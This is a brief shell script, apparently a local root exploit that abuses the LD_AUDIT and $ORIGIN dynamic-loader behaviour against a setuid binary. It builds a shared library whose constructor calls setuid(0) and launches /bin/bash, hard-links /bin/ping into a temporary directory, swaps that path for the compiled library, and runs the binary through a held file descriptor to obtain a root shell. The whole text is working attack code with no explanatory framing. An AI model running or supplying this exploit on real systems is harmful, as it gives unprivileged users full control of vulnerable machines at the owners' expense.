#!/bin/sh
echo wait
cat > a.c << _EOF
void __attribute__((constructor)) init()
{
   setuid(0);
   system("/bin/bash");
}
_EOF
mkdir /tmp/lenis
ln /bin/ping /tmp/lenis/target
exec 3< /tmp/lenis/target
rm -rf /tmp/lenis/
gcc -w -fPIC -shared -o /tmp/lenis a.c
rm -r a.c
LD_AUDIT="\$ORIGIN" exec /proc/self/fd/3